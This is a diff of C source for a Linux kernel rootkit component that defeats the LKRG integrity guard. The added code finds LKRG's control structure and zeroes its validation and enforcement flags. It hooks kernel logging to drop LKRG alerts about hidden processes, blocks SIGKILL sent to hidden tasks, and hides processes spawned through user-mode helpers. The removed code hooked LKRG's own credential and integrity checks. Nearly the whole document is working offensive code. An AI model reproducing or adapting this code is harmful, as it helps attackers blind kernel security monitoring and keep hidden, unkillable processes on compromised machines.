@@ -1,37 +1,92 @@
-/*
-
-    Simple and poop initial version of LKRG Bypass
-    Initial tests
-*/
-
 #include "../include/core.h"
 #include "../ftrace/ftrace_helper.h"
 #include "../include/hidden_pids.h"
 #include "../include/lkrg_bypass.h"
 
-static void (*orig_kprobe_ftrace_handler)(unsigned long ip, unsigned long parent_ip,
-                                         struct ftrace_ops *ops, struct pt_regs *regs) = NULL;
-static int (*orig_p_cmp_creds)(void *p_orig, const void *p_current_cred, void *p_current) = NULL;
-static int (*orig_p_cmp_tasks)(void *p_orig, char p_kill) = NULL;
-static int (*orig_p_ed_pcfi_validate_sp)(void *p_task, void *p_orig, unsigned long p_sp) = NULL;
-static int (*orig_p_ed_enforce_pcfi)(void *p_task, void *p_orig, void *p_regs) = NULL;
-static void (*orig_p_check_integrity)(void) = NULL;
-static int (*orig_p_exploit_detection_init)(void) = NULL;
-static int (*orig_p_call_usermodehelper_entry)(const char *path, char **argv, char **envp) = NULL;
-static void (*orig_p_call_usermodehelper_ret)(void) = NULL;
-static int (*orig_p_call_usermodehelper_exec_entry)(void *sub_info) = NULL;
-static void (*orig_p_dump_task_f)(void *p_arg) = NULL;
-static int (*orig_ed_task_add)(void *p_ed_process) = NULL;
-
-static unsigned long addr_do_exit = 0;
-static unsigned long addr_do_group_exit = 0;
-static atomic_t umh_bypass_active = ATOMIC_INIT(0);
 static atomic_t hooks_active = ATOMIC_INIT(0);
+static atomic_t umh_bypass_active = ATOMIC_INIT(0);
 static struct notifier_block module_notifier;
-static atomic_t lkrg_initializing = ATOMIC_INIT(0);
+
+static char lkrg_log_buf[512];
+static DEFINE_SPINLOCK(lkrg_log_lock);
+
+static void *p_lkrg_global_ctrl_ptr = NULL;
+
+#define LKRG_CTRL_UMH_VALIDATE_OFFSET  0x30
+#define LKRG_CTRL_UMH_ENFORCE_OFFSET   0x34
+#define LKRG_CTRL_PINT_VALIDATE_OFFSET 0x08
+#define LKRG_CTRL_PINT_ENFORCE_OFFSET  0x0c
+
+static unsigned int saved_umh_validate = 1;
+static unsigned int saved_umh_enforce = 1;
+static unsigned int saved_pint_validate = 3;
+static unsigned int saved_pint_enforce = 1;
+static DEFINE_SPINLOCK(lkrg_ctrl_lock);
+
+static notrace bool find_lkrg_ctrl(void)
+{
+    if (p_lkrg_global_ctrl_ptr)
+        return true;
+    
+    p_lkrg_global_ctrl_ptr = resolve_sym("p_lkrg_global_ctrl");
+    return p_lkrg_global_ctrl_ptr != NULL;
+}
+
+static notrace void disable_lkrg_umh_protection(void)
+{
+    unsigned int *umh_validate, *umh_enforce;
+    unsigned int *pint_validate, *pint_enforce;
+    unsigned long flags;
+    
+    if (!p_lkrg_global_ctrl_ptr && !find_lkrg_ctrl())
+        return;
+    
+    spin_lock_irqsave(&lkrg_ctrl_lock, flags);
+    
+    umh_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_VALIDATE_OFFSET);
+    umh_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_ENFORCE_OFFSET);
+    pint_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_VALIDATE_OFFSET);
+    pint_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_ENFORCE_OFFSET);
+    
+    saved_umh_validate = *umh_validate;
+    saved_umh_enforce = *umh_enforce;
+    saved_pint_validate = *pint_validate;
+    saved_pint_enforce = *pint_enforce;
+    
+    *umh_validate = 0;
+    *umh_enforce = 0;
+    *pint_validate = 0;
+    *pint_enforce = 0;
+    
+    spin_unlock_irqrestore(&lkrg_ctrl_lock, flags);
+}
+
+static notrace void restore_lkrg_umh_protection(void)
+{
+    unsigned int *umh_validate, *umh_enforce;
+    unsigned int *pint_validate, *pint_enforce;
+    unsigned long flags;
+    
+    if (!p_lkrg_global_ctrl_ptr)
+        return;
+    
+    spin_lock_irqsave(&lkrg_ctrl_lock, flags);
+    
+    umh_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_VALIDATE_OFFSET);
+    umh_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_ENFORCE_OFFSET);
+    pint_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_VALIDATE_OFFSET);
+    pint_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_ENFORCE_OFFSET);
+    
+    *umh_validate = saved_umh_validate;
+    *umh_enforce = saved_umh_enforce;
+    *pint_validate = saved_pint_validate;
+    *pint_enforce = saved_pint_enforce;
+    
+    spin_unlock_irqrestore(&lkrg_ctrl_lock, flags);
+}
 
 static const char *lkrg_symbols[] = {
-    "p_dump_task_f",
+    "p_lkrg_global_ctrl",
     "p_cmp_creds",
     "p_check_integrity",
     NULL
@@ -40,27 +95,11 @@ static const char *lkrg_symbols[] = {
 static notrace bool is_lkrg_present(void)
 {
     int i, found = 0;
-    unsigned long *addr;
-    
     for (i = 0; lkrg_symbols[i] != NULL; i++) {
-        addr = resolve_sym(lkrg_symbols[i]);
-        if (addr != NULL)
+        if (resolve_sym(lkrg_symbols[i]) != NULL)
             found++;
     }
-    
     return (found >= 2);
-}
-
-static inline bool should_hide_pid_by_int(int pid)
-{
-    int i;
-    if (pid <= 0)
-        return false;
-    for (i = 0; i < hidden_count; i++) {
-        if (hidden_pids[i] == pid)
-            return true;
-    }
-    return false;
 }
 
 static notrace bool is_lineage_hidden(struct task_struct *task)
@@ -68,10 +107,8 @@ static notrace bool is_lineage_hidden(struct task_struct *task)
     int depth = 0;
     struct task_struct *parent;
     
-    if (!task)
-        task = current;
-    if (!task)
-        return false;
+    if (!task) task = current;
+    if (!task) return false;
     
     while (task && depth < 64) {
         if (is_hidden_pid(task->pid) || is_hidden_pid(task->tgid) ||
@@ -79,7 +116,7 @@ static notrace bool is_lineage_hidden(struct task_struct *task)
             return true;
         
         parent = task->real_parent;
-        if (!parent || parent == task || task->pid == 1 || task->pid == 0)
+        if (!parent || parent == task || task->pid <= 1)
             break;
         task = parent;
         depth++;
@@ -87,179 +124,179 @@ static notrace bool is_lineage_hidden(struct task_struct *task)
     return false;
 }
 
-static notrace bool should_hide_current(void)
-{
-    return current ? is_lineage_hidden(current) : false;
-}
-
 static notrace bool should_hide_task(struct task_struct *task)
 {
     return task ? is_lineage_hidden(task) : false;
 }
 
-static notrace void hook_p_dump_task_f(void *p_arg)
+static notrace pid_t extract_pid_from_log(const char *msg)
 {
-    struct task_struct *task = (struct task_struct *)p_arg;
-    if (!task) {
-        if (orig_p_dump_task_f)
-            orig_p_dump_task_f(p_arg);
+    const char *p;
+    pid_t pid = 0;
+    
+    if (!msg) return 0;
+    
+    p = strstr(msg, "pid ");
+    if (!p) p = strstr(msg, "Killing pid ");
+    if (!p) return 0;
+    
+    while (*p && (*p < '0' || *p > '9')) p++;
+    while (*p >= '0' && *p <= '9') {
+        pid = pid * 10 + (*p - '0');
+        p++;
+    }
+    return pid;
+}
+
+static notrace bool should_filter_log(const char *msg)
+{
+    pid_t pid;
+    int i;
+    
+    if (!msg || !strstr(msg, "LKRG")) return false;
+    
+    if (atomic_read(&umh_bypass_active) > 0) {
+        if (strstr(msg, "UMH") || strstr(msg, "BLOCK") ||
+            strstr(msg, "usermodehelper") || strstr(msg, "Blocked"))
+            return true;
+    }
+    
+    pid = extract_pid_from_log(msg);
+    if (pid > 0) {
+        for (i = 0; i < hidden_count && i < MAX_HIDDEN_PIDS; i++)
+            if (hidden_pids[i] == pid) return true;
+        for (i = 0; i < child_count && i < MAX_CHILD_PIDS; i++)
+            if (child_pids[i] == pid) return true;
+    }
+    
+    return false;
+}
+
+static asmlinkage int (*orig_vprintk_emit)(int facility, int level,
+    const struct dev_printk_info *dev_info, const char *fmt, va_list args) = NULL;
+
+static notrace asmlinkage int hook_vprintk_emit(int facility, int level,
+    const struct dev_printk_info *dev_info, const char *fmt, va_list args)
+{
+    unsigned long flags;
+    va_list args_copy;
+    bool filter = false;
+    int len = 0;
+    
+    if (!orig_vprintk_emit || !fmt) 
+        return orig_vprintk_emit ? orig_vprintk_emit(facility, level, dev_info, fmt, args) : 0;
+    
+    if (!strstr(fmt, "LKRG") && !strstr(fmt, "lkrg") && !strstr(fmt, "p_lkrg"))
+        return orig_vprintk_emit(facility, level, dev_info, fmt, args);
+    
+    spin_lock_irqsave(&lkrg_log_lock, flags);
+    va_copy(args_copy, args);
+    len = vsnprintf(lkrg_log_buf, sizeof(lkrg_log_buf) - 1, fmt, args_copy);
+    va_end(args_copy);
+    lkrg_log_buf[sizeof(lkrg_log_buf) - 1] = '\0';
+    filter = should_filter_log(lkrg_log_buf);
+    spin_unlock_irqrestore(&lkrg_log_lock, flags);
+    
+    if (filter) return len;
+    return orig_vprintk_emit(facility, level, dev_info, fmt, args);
+}
+
+static int (*orig_do_send_sig_info)(int sig, struct kernel_siginfo *info,
+    struct task_struct *p, enum pid_type type) = NULL;
+
+static notrace int hook_do_send_sig_info(int sig, struct kernel_siginfo *info,
+    struct task_struct *p, enum pid_type type)
+{
+    if (sig == SIGKILL && p && should_hide_task(p))
+        return 0;
+    return orig_do_send_sig_info ? orig_do_send_sig_info(sig, info, p, type) : 0;
+}
+
+static int (*orig_send_sig_info)(int sig, struct kernel_siginfo *info,
+    struct task_struct *p) = NULL;
+
+static notrace int hook_send_sig_info(int sig, struct kernel_siginfo *info,
+    struct task_struct *p)
+{
+    if (sig == SIGKILL && p && should_hide_task(p))
+        return 0;
+    return orig_send_sig_info ? orig_send_sig_info(sig, info, p) : 0;
+}
+
+static int (*orig___send_signal_locked)(int sig, struct kernel_siginfo *info,
+    struct task_struct *t, enum pid_type type, bool force) = NULL;
+
+static notrace int hook___send_signal_locked(int sig, struct kernel_siginfo *info,
+    struct task_struct *t, enum pid_type type, bool force)
+{
+    if (sig == SIGKILL && t && should_hide_task(t))
+        return 0;
+    return orig___send_signal_locked ? 
+        orig___send_signal_locked(sig, info, t, type, force) : 0;
+}
+
+static void (*orig_force_sig)(int sig) = NULL;
+
+static notrace void hook_force_sig(int sig)
+{
+    if (sig == SIGKILL && should_hide_task(current))
         return;
-    }
-    if (should_hide_task(task)) {
-        add_child_pid(task->pid);
-        add_child_pid(task->tgid);
-        return;
-    }
-    if (orig_p_dump_task_f)
-        orig_p_dump_task_f(p_arg);
-}
-
-static notrace int hook_ed_task_add(void *p_ed_process)
-{
-    if (should_hide_current())
-        return 0;
-    return orig_ed_task_add ? orig_ed_task_add(p_ed_process) : 0;
-}
-
-static notrace void hook_kprobe_ftrace_handler(unsigned long ip, unsigned long parent_ip,
-                                               struct ftrace_ops *ops, struct pt_regs *regs)
-{
-    if (!orig_kprobe_ftrace_handler)
+    
+    if (sig == SIGKILL && atomic_read(&umh_bypass_active) > 0)
         return;
     
-    if (atomic_read(&lkrg_initializing)) {
-        orig_kprobe_ftrace_handler(ip, parent_ip, ops, regs);
-        return;
+    if (orig_force_sig)
+        orig_force_sig(sig);
+}
+
+static int (*orig_call_usermodehelper_exec_async)(void *data) = NULL;
+
+static notrace int hook_call_usermodehelper_exec_async(void *data)
+{
+    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+    
+    if (bypass_active) {
+        disable_lkrg_umh_protection();
+        add_hidden_pid(current->pid);
+        add_child_pid(current->pid);
     }
     
-    if ((addr_do_exit && ip >= addr_do_exit && ip < addr_do_exit + 0x10) ||
-        (addr_do_group_exit && ip >= addr_do_group_exit && ip < addr_do_group_exit + 0x10)) {
-        orig_kprobe_ftrace_handler(ip, parent_ip, ops, regs);
-        return;
+    return orig_call_usermodehelper_exec_async ?
+        orig_call_usermodehelper_exec_async(data) : 0;
+}
+
+static int (*orig_call_usermodehelper_exec)(struct subprocess_info *sub_info, int wait) = NULL;
+
+static notrace int hook_call_usermodehelper_exec(struct subprocess_info *sub_info, int wait)
+{
+    int ret;
+    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+    
+    if (bypass_active) {
+        disable_lkrg_umh_protection();
+        add_hidden_pid(current->pid);
     }
     
-    orig_kprobe_ftrace_handler(ip, parent_ip, ops, regs);
-}
-
-static notrace int hook_p_cmp_creds(void *p_orig, const void *p_current_cred, void *p_current)
-{
-    struct task_struct *task = (struct task_struct *)p_current;
+    ret = orig_call_usermodehelper_exec ? 
+        orig_call_usermodehelper_exec(sub_info, wait) : -ENOENT;
     
-    if (!p_orig || !p_current_cred || !p_current)
-        return 0;
+    if (bypass_active)
+        restore_lkrg_umh_protection();
     
-    if (task && should_hide_task(task))
-        return 0;
-    return orig_p_cmp_creds ? orig_p_cmp_creds(p_orig, p_current_cred, p_current) : 0;
+    return ret;
 }
-
-static notrace int hook_p_cmp_tasks(void *p_orig, char p_kill)
-{
-    if (should_hide_current())
-        return 0;
-    return orig_p_cmp_tasks ? orig_p_cmp_tasks(p_orig, p_kill) : 0;
-}
-
-static notrace int hook_p_ed_pcfi_validate_sp(void *p_task, void *p_orig, unsigned long p_sp)
-{
-    struct task_struct *task = (struct task_struct *)p_task;
-    
-    if (!p_task || !p_orig)
-        return 0;
-    
-    if ((task && should_hide_task(task)) || should_hide_current())
-        return 0;
-    return orig_p_ed_pcfi_validate_sp ? orig_p_ed_pcfi_validate_sp(p_task, p_orig, p_sp) : 0;
-}
-
-static notrace int hook_p_ed_enforce_pcfi(void *p_task, void *p_orig, void *p_regs)
-{
-    struct task_struct *task = (struct task_struct *)p_task;
-    
-    if (!p_task || !p_orig || !p_regs)
-        return 0;
-    
-    if ((task && should_hide_task(task)) || should_hide_current())
-        return 0;
-    
-    return orig_p_ed_enforce_pcfi ? orig_p_ed_enforce_pcfi(p_task, p_orig, p_regs) : 0;
-}
-
-static notrace void hook_p_check_integrity(void)
-{
-    if (atomic_read(&hooks_active) && hidden_count > 0) {
-        return;
-    }
-    if (orig_p_check_integrity)
-        orig_p_check_integrity();
-}
-
-static notrace int hook_p_exploit_detection_init(void)
-{
-    return 0;
-}
-
-static notrace int hook_p_call_usermodehelper_entry(const char *path, char **argv, char **envp)
-{
-    if (atomic_read(&umh_bypass_active)) {
-        return 0;
-    }
-    
-    if (should_hide_current()) {
-        return 0;
-    }
-    
-    return orig_p_call_usermodehelper_entry ? 
-           orig_p_call_usermodehelper_entry(path, argv, envp) : 0;
-}
-
-static notrace int hook_p_call_usermodehelper_exec_entry(void *sub_info)
-{
-    if (atomic_read(&umh_bypass_active) || should_hide_current()) {
-        return 0;
-    }
-    return orig_p_call_usermodehelper_exec_entry ? 
-           orig_p_call_usermodehelper_exec_entry(sub_info) : 0;
-}
-
-static notrace void hook_p_call_usermodehelper_ret(void)
-{
-    if (atomic_read(&umh_bypass_active) || should_hide_current()) {
-        return;
-    }
-    if (orig_p_call_usermodehelper_ret)
-        orig_p_call_usermodehelper_ret();
-}
-
-notrace void enable_umh_bypass(void)
-{
-    atomic_inc(&umh_bypass_active);
-}
-EXPORT_SYMBOL(enable_umh_bypass);
-
-notrace void disable_umh_bypass(void)
-{
-    if (atomic_read(&umh_bypass_active) > 0)
-        atomic_dec(&umh_bypass_active);
-}
-EXPORT_SYMBOL(disable_umh_bypass);
 
 static struct ftrace_hook lkrg_hooks[] = {
-    HOOK("p_dump_task_f", hook_p_dump_task_f, &orig_p_dump_task_f),
-    HOOK("ed_task_add", hook_ed_task_add, &orig_ed_task_add),
-    HOOK("kprobe_ftrace_handler", hook_kprobe_ftrace_handler, &orig_kprobe_ftrace_handler),
-    HOOK("p_cmp_creds", hook_p_cmp_creds, &orig_p_cmp_creds),
-    HOOK("p_cmp_tasks", hook_p_cmp_tasks, &orig_p_cmp_tasks),
-    HOOK("p_ed_pcfi_validate_sp", hook_p_ed_pcfi_validate_sp, &orig_p_ed_pcfi_validate_sp),
-    HOOK("p_ed_enforce_pcfi", hook_p_ed_enforce_pcfi, &orig_p_ed_enforce_pcfi),
-    HOOK("p_check_integrity", hook_p_check_integrity, &orig_p_check_integrity),
-    HOOK("p_exploit_detection_init", hook_p_exploit_detection_init, &orig_p_exploit_detection_init),
-    HOOK("p_call_usermodehelper_entry", hook_p_call_usermodehelper_entry, &orig_p_call_usermodehelper_entry),
-    HOOK("p_call_usermodehelper_exec_entry", hook_p_call_usermodehelper_exec_entry, &orig_p_call_usermodehelper_exec_entry),
-    HOOK("p_call_usermodehelper_ret", hook_p_call_usermodehelper_ret, &orig_p_call_usermodehelper_ret),
+    HOOK("vprintk_emit", hook_vprintk_emit, &orig_vprintk_emit),
+    HOOK("do_send_sig_info", hook_do_send_sig_info, &orig_do_send_sig_info),
+    HOOK("send_sig_info", hook_send_sig_info, &orig_send_sig_info),
+    HOOK("__send_signal_locked", hook___send_signal_locked, &orig___send_signal_locked),
+    HOOK("force_sig", hook_force_sig, &orig_force_sig),
+    HOOK("call_usermodehelper_exec_async", hook_call_usermodehelper_exec_async, &orig_call_usermodehelper_exec_async),
+    HOOK("call_usermodehelper_exec", hook_call_usermodehelper_exec, &orig_call_usermodehelper_exec),
 };
 
-notrace static int try_install_hooks(void)
+static notrace int try_install_hooks(void)
 {
     int i, installed = 0;
     
@@ -277,50 +314,9 @@ notrace static int try_install_hooks(void)
     return -ENOENT;
 }
 
-notrace static int module_notify(struct notifier_block *nb, unsigned long action, void *data)
-{
-    if (action == MODULE_STATE_COMING) {
-        atomic_set(&lkrg_initializing, 1);
-    } else if (action == MODULE_STATE_LIVE) {
-        msleep(2000);
-        atomic_set(&lkrg_initializing, 0);
-        
-        if (is_lkrg_present()) {
-            try_install_hooks();
-        }
-    }
-    return NOTIFY_DONE;
-}
-
-notrace int lkrg_bypass_init(void)
-{
-    unsigned long *sym;
-    
-    sym = resolve_sym("do_exit");
-    if (sym)
-        addr_do_exit = (unsigned long)sym;
-    
-    sym = resolve_sym("do_group_exit");
-    if (sym)
-        addr_do_group_exit = (unsigned long)sym;
-    
-    if (is_lkrg_present()) {
-        msleep(1000);
-        try_install_hooks();
-    }
-    
-    module_notifier.notifier_call = module_notify;
-    register_module_notifier(&module_notifier);
-    
-    return 0;
-}
-
-notrace void lkrg_bypass_exit(void)
+static notrace void remove_hooks(void)
 {
     int i;
-    
-    unregister_module_notifier(&module_notifier);
-    
     for (i = ARRAY_SIZE(lkrg_hooks) - 1; i >= 0; i--) {
         if (lkrg_hooks[i].address)
             fh_remove_hook(&lkrg_hooks[i]);
@@ -328,7 +324,62 @@ notrace void lkrg_bypass_exit(void)
     atomic_set(&hooks_active, 0);
 }
 
+static notrace int module_notify(struct notifier_block *nb, unsigned long action, void *data)
+{
+    struct module *mod = data;
+    
+    if (!mod) return NOTIFY_DONE;
+    
+    if (action == MODULE_STATE_LIVE && strstr(mod->name, "lkrg")) {
+        msleep(2000);
+        find_lkrg_ctrl();
+    }
+    return NOTIFY_DONE;
+}
+
+notrace void enable_umh_bypass(void)
+{
+    atomic_inc(&umh_bypass_active);
+    
+    if (p_lkrg_global_ctrl_ptr || find_lkrg_ctrl())
+        disable_lkrg_umh_protection();
+}
+EXPORT_SYMBOL(enable_umh_bypass);
+
+notrace void disable_umh_bypass(void)
+{
+    if (atomic_read(&umh_bypass_active) > 0)
+        atomic_dec(&umh_bypass_active);
+    
+    if (atomic_read(&umh_bypass_active) == 0 && p_lkrg_global_ctrl_ptr)
+        restore_lkrg_umh_protection();
+}
+EXPORT_SYMBOL(disable_umh_bypass);
+
 notrace bool is_lkrg_blinded(void)
 {
     return atomic_read(&hooks_active) > 0;
+}
+
+notrace int lkrg_bypass_init(void)
+{
+    try_install_hooks();
+    
+    module_notifier.notifier_call = module_notify;
+    register_module_notifier(&module_notifier);
+    
+    if (is_lkrg_present())
+        find_lkrg_ctrl();
+    
+    return 0;
+}
+
+notrace void lkrg_bypass_exit(void)
+{
+    if (p_lkrg_global_ctrl_ptr && atomic_read(&umh_bypass_active) > 0)
+        restore_lkrg_umh_protection();
+    
+    unregister_module_notifier(&module_notifier);
+    remove_hooks();
+    atomic_set(&umh_bypass_active, 0);
 }
